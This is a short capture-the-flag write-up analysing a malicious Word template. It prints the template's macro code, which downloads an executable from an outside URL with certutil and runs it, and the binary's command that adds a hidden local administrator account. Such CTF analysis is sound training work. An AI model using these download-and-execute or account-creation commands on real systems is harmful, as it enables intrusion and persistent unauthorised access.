## Task 1: Resign Letter
Question: 

Flag: `RWSC{p@ss123}`

We are given a weird document template file created by Microsoft Word. When opening it, macros can be found.

![image](https://hackmd.io/_uploads/BJ-lW6Hp6.png)

Opening the macro named `Test` as shown below provides us with the following code.

![image](https://hackmd.io/_uploads/rkgoLZaHap.png)

```
Shell ("cmd /c certutil.exe -urlcache -split -f https://github.com/fareedfauzi/Adv_Sim/raw/main/lenovo.exe %temp%\lenovo.exe")
Shell ("cmd /c %temp%\lenovo.exe")
```

Downloading the mallicious binary and using strings, we can see that it executes:
```
cmd.exe /c net user f14g cEBzczEyMw== /ADD && net localgroup Administrators f14g /ADD
```

It tries to add the user `f14g` with password `cEBzczEyMw==` to the local machine and add it to the `Administrators` group. Decode the password with base64 for the flag.
